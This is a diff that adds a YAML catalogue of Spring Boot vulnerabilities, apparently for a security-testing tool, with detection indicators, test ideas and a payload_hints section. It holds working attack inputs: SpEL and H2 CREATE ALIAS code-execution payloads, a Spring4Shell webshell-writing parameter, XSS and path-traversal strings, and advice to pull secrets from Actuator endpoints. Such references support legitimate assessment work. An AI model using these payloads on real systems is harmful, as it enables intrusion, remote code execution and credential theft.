@@ -1,0 +1,120 @@
+tech_name: Spring Boot
+
+common_vulns:
+  - vuln_name: Spring4Shell (CVE-2022-22965) — RCE via Data Binding
+    description: >
+      When Spring MVC or WebFlux is deployed on JDK 9+ with Tomcat as a WAR,
+      attacker-controlled class.module.classLoader properties can write arbitrary
+      files (JSP webshell) via data binding.
+    indicators:
+      - "class.module.classLoader"
+      - "Spring Framework"
+      - "Tomcat"
+      - "@RequestMapping"
+    test_idea: >
+      Send GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=
+      and observe for a 400 vs 200 differential. Exploit to write a JSP shell.
+
+  - vuln_name: Actuator Endpoint Exposure
+    description: >
+      Spring Boot Actuator endpoints (/actuator/env, /actuator/heapdump,
+      /actuator/shutdown) exposed without authentication leak configuration,
+      credentials, and allow remote shutdown or bean manipulation.
+    indicators:
+      - "/actuator"
+      - "/actuator/env"
+      - "/actuator/heapdump"
+      - "management.endpoints.web.exposure.include=*"
+    test_idea: >
+      Fetch /actuator/env for credentials and secret keys. /actuator/heapdump
+      returns a JVM heap dump parseable with Eclipse MAT for in-memory secrets.
+
+  - vuln_name: SpEL Injection (Spring Expression Language)
+    description: >
+      User input evaluated through SpEL (e.g., in @Value annotations, gateway
+      predicates, or custom evaluators) allows arbitrary Java code execution.
+    indicators:
+      - "ExpressionParser"
+      - "parseExpression("
+      - "#{...}"
+      - "StandardEvaluationContext"
+    test_idea: >
+      Inject #{7*7} or #{T(java.lang.Runtime).getRuntime().exec('id')} into
+      parameters processed by Spring EL evaluators.
+
+  - vuln_name: Deserialization via Java Object Streams
+    description: >
+      Endpoints accepting Java serialized objects (Content-Type: application/x-java-serialized-object)
+      with vulnerable gadget chains (Apache Commons Collections, Spring gadgets) lead to RCE.
+    indicators:
+      - "ObjectInputStream"
+      - "readObject("
+      - "application/x-java-serialized-object"
+      - "aced0005" # Java serialization magic bytes in hex
+    test_idea: >
+      Use ysoserial to generate a payload for known gadget chains (CommonsCollections6,
+      Spring1) and send it to deserialization endpoints.
+
+  - vuln_name: Insecure Spring Security Configuration
+    description: >
+      Misconfigured HttpSecurity (e.g., antMatchers().permitAll() over-broad
+      patterns, disabled CSRF for REST APIs without stateless auth) expose
+      protected endpoints.
+    indicators:
+      - "permitAll()"
+      - ".csrf().disable()"
+      - "antMatchers(\"/**\")"
+    test_idea: >
+      Test access to /admin/**, /api/internal/**, /actuator/** endpoints without
+      authentication. Try pattern bypass with /admin;a=b/ or /admin/%2f/../.
+
+  - vuln_name: Path Traversal in Resource Handler
+    description: >
+      addResourceHandlers() mapping user-controlled paths allows traversal outside
+      the intended resource directory.
+    indicators:
+      - "addResourceHandlers"
+      - "classpath:/"
+      - "file:/"
+    test_idea: >
+      Request /static/../../WEB-INF/web.xml or /resources/../application.properties.
+      URL encode traversal characters to bypass simple filters.
+
+  - vuln_name: H2 Console Remote Code Execution
+    description: >
+      H2 in-memory database console enabled in production (spring.h2.console.enabled=true)
+      without authentication allows arbitrary SQL execution including RCE via
+      CREATE ALIAS for Java method calls.
+    indicators:
+      - "/h2-console"
+      - "spring.h2.console.enabled=true"
+    test_idea: >
+      Access /h2-console. If accessible, execute:
+      CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception {
+      Runtime.getRuntime().exec(cmd); return "ok"; } $$; CALL EXEC('id');
+
+  - vuln_name: Reflected XSS in Error Pages
+    description: >
+      Spring Boot's default Whitelabel error page or custom error controllers
+      reflecting request parameters (e.g., message, error) without encoding.
+    indicators:
+      - "Whitelabel Error Page"
+      - "There was an unexpected error"
+      - "error.path"
+    test_idea: >
+      Trigger an error with ?message=<script>alert(1)</script> or embed XSS in
+      the URL path /path/<svg/onload=alert(1)> and observe the error page response.
+
+misconfigurations:
+  - spring.profiles.active=dev in production
+  - logging.level.root=DEBUG exposing sensitive data in logs
+  - server.error.include-stacktrace=always
+  - spring.datasource.password in application.properties in VCS
+  - Actuator not behind spring-security management port filter
+
+payload_hints:
+  spel_injection: "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+  actuator_env: "/actuator/env"
+  actuator_heapdump: "/actuator/heapdump"
+  spring4shell: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B"
+  h2_rce: "CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd); return cmd; } $$;"
